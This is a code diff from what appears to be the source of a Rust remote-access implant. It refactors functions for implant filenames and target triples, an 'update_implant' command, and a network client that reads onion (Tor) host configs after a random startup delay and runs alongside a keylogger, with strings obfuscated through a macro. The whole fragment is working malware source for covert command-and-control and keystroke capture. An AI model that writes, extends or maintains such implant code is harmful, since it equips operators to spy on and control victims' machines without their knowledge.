@@ -130,7 +130,7 @@ fn get_username() -> String {
         .unwrap_or_else(|_| astr!("unknown"))
 }
 
-fn get_target_triple() -> &'static str {
+fn get_target_triple() -> String {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     {
         astr!("x86_64-unknown-linux-gnu")
@@ -161,7 +161,7 @@ fn get_target_triple() -> &'static str {
     }
 }
 
-fn get_implant_filename(is_dll: bool) -> &'static str {
+fn get_implant_filename(is_dll: bool) -> String {
     if is_dll {
         #[cfg(target_os = "windows")]
         {
@@ -520,8 +520,7 @@ Available commands:
         }
 
         _ if cmd == astr!("update_implant") => {
-            let target_triple = get_target_triple();
-            let is_dll = util::is_dll();
+            let is_dll = util::is_dll::is_dll();
 
             let current_path = if is_dll {
                 #[cfg(target_os = "windows")]
@@ -556,9 +555,9 @@ Available commands:
                 })
                 .ok_or_else(|| anyhow!(astr!("update_implant: dist directory not found")))?;
 
-            let implant_dir = dist_path.join(get_target_triple().as_str());
+            let implant_dir = dist_path.join(get_target_triple());
             let implant_name = get_implant_filename(is_dll);
-            let new_implant = implant_dir.join(implant_name.as_str());
+            let new_implant = implant_dir.join(&implant_name);
 
             if !new_implant.exists() {
                 return Ok(format!(
@@ -893,7 +892,7 @@ pub async fn netclient_run(
     }
 }
 
-async fn netclient_impl() -> c_int {
+async fn netclient_impl() {
     let startup_delay = rand_range(1, 13);
     println!(
         "{}{}{}",
@@ -906,7 +905,7 @@ async fn netclient_impl() -> c_int {
     let configs = get_onion_configs();
     if configs.is_empty() {
         println!("{}", &astr!("No valid hostname:port entries in config"));
-        return 1;
+        return;
     }
 
     let _n_configs = configs.len();
@@ -930,7 +929,6 @@ async fn netclient_impl() -> c_int {
             let _ = netclient_run(cfg.clone(), keylogger.clone()).await;
         }
     }
-    0
 }
 pub async fn netclient() -> c_int {
     netclient_impl().await;
